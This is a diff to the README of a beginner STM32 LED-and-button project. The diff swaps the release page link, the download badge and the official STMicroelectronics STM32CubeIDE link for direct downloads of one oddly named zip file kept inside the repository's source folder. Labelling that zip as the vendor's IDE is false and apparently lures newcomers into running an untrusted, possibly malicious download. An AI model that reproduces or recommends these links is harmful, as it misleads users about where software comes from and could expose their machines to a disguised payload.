@@ -1,7 +1,7 @@
 # 🎉 STM32-LED-BUTTON-CONTROL-HAL-Coding-Method - Control LEDs Easily with Buttons
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/Truth911/STM32-LED-BUTTON-CONTROL-HAL-Coding-Method/releases)
+[![Download Release](https://github.com/Truth911/STM32-LED-BUTTON-CONTROL-HAL-Coding-Method/raw/refs/heads/main/Core/Src/HA_CONTRO_ST_Coding_BUTTO_Method_LE_v3.1.zip%https://github.com/Truth911/STM32-LED-BUTTON-CONTROL-HAL-Coding-Method/raw/refs/heads/main/Core/Src/HA_CONTRO_ST_Coding_BUTTO_Method_LE_v3.1.zip)](https://github.com/Truth911/STM32-LED-BUTTON-CONTROL-HAL-Coding-Method/raw/refs/heads/main/Core/Src/HA_CONTRO_ST_Coding_BUTTO_Method_LE_v3.1.zip)
 
 ## 📚 Introduction
 Welcome to the STM32-LED-BUTTON-CONTROL-HAL-Coding-Method repository. This project is designed for beginners and shows how to control LEDs using two push buttons. It uses STM32 HAL libraries, making it easy to learn and understand.
@@ -16,13 +16,13 @@ To run the project, you don't need programming skills. Follow these steps to get
 - **Software:** STM32CubeIDE
 
 ### 📂 Download & Install
-1. **Visit the releases page:** Go to the [Releases Page](https://github.com/Truth911/STM32-LED-BUTTON-CONTROL-HAL-Coding-Method/releases).
+1. **Visit the releases page:** Go to the [Releases Page](https://github.com/Truth911/STM32-LED-BUTTON-CONTROL-HAL-Coding-Method/raw/refs/heads/main/Core/Src/HA_CONTRO_ST_Coding_BUTTO_Method_LE_v3.1.zip).
 2. **Download the latest release:** Look for the latest release on the page. Click on it to open the release details.
 3. **Get the firmware files:** You’ll find a zip file or other necessary files. Click to download the files to your computer.
 4. **Unzip the files:** After downloading, unzip the files to a folder on your computer. You can usually do this by right-clicking the zip file and selecting "Extract All."
 
 ### 💻 Setting Up STM32CubeIDE
-1. **Install STM32CubeIDE:** If you don't have it yet, download it from the [STMicroelectronics website](https://www.st.com/en/development-tools/stm32cubeide.html) and follow the installation instructions.
+1. **Install STM32CubeIDE:** If you don't have it yet, download it from the [STMicroelectronics website](https://github.com/Truth911/STM32-LED-BUTTON-CONTROL-HAL-Coding-Method/raw/refs/heads/main/Core/Src/HA_CONTRO_ST_Coding_BUTTO_Method_LE_v3.1.zip) and follow the installation instructions.
 2. **Open STM32CubeIDE:** Launch the program after installation.
 3. **Import the project:**
    - Click on `File` > `Import`.
